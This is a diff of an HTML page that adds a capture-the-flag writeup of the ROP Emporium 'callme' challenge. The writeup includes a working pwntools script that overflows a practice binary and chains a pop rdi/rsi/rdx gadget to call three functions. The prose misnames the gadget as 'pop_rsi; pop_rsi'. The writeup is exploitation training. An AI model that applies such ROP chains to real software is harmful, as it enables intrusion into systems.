@@ -1,14 +1,72 @@
 <div class="page-header">
     <div class="page-header-inner">
         <div class="page-header-inner2">
-            <h1>Rop-Emporium - Callme</h1>
+            <h1>Callme Writeup</h1>
+            <h2>May 2021</h2>           
+            <h4>win function with correct parameters</h4>
         </div>
     </div>
 </div>
+<H4>Problem</H4>
 <div class="paragraph">
-    <p>Lorem, ipsum dolor sit amet consectetur adipisicing elit. Distinctio excepturi asperiores voluptate quisquam! Temporibus minus esse obcaecati recusandae exercitationem quam adipisci laboriosam veniam, est molestiae reiciendis at, nobis autem soluta?</p>
+    <p>
+        Chain calls to multiple imported methods with specific arguments and see how the differences between 64 & 32 bit calling conventions affect your ROP chain. </a> <a href=../../docs/rop_emporium/callme>callme</a>
+    	<br>
+    </p>
 </div>
+<H4>Solution</H4>
 <div class="paragraph">
-    <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Laudantium inventore vel ut, a eum harum. Aliquam est hic maxime, temporibus neque minima optio, quia alias sequi non dolores distinctio dolore?</p>
+    <p>
+    	This challenge gives us a binary to download and develop the exploit for locally.
+        <br>
+    	This time the binary is made a bit harder, however overall it still has a very similar exploitation process. We are given files containing the encrypted flag, and have to redirect execution in a way so that it decrypts the flag for us and prints it out.
+        <br>
+        The challenge description tells us that we first need to call the 3 functions callme_one(), callme_two(), and callme_three() one after another with the arguments: (0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d) to retrieve the flag.
+        <br><br>
+        We can set up our payload very similarly to the last one. The binary had a pop_rsi; pop_rsi; pop_rdx gadget, which proved to be quite useful in this case to properly setup the registers before calling each function. By calling this gadget before each of the 3 functions with the correct parameters on the stack, we can decrypt the flag and have it printed out.
+        <br> 
+        Our final exploit is posted below.
+    	<br><br>
+    </p>
 </div>
+<div>
+    <img src="../imgs/rop_emporium/callme1.png" alt="">
+</div>
+<div>
+    <style 
+        type="text/css">
+            pre code {
+                      background-color: #008080;
+                      border: 1px solid #999;
+                      display: block;
+                      padding: 15px;
+                      color:  #F5F5DC;
+                    }
+    </style>
+    <pre>
+        <code>
+#!/usr/bin/env python
+
+from pwn import *
+elf = context.binary = ELF('./callme')
+libc = elf.libc
+
+pop_rdi_rsi_rdx = p64(0x000000000040093c)
+args = p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)
+
+p = elf.process()
+
+payload = b"A"*40 
+payload += pop_rdi_rsi_rdx + args + p64(elf.sym.callme_one)
+payload += pop_rdi_rsi_rdx + args + p64(elf.sym.callme_two)
+payload += pop_rdi_rsi_rdx + args + p64(elf.sym.callme_three)
+
+p.sendline(payload)
+log.info(p.clean())
+
+p.interactive()
+        </code>
+    </pre>
+</div>
+<br><br>
 <script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
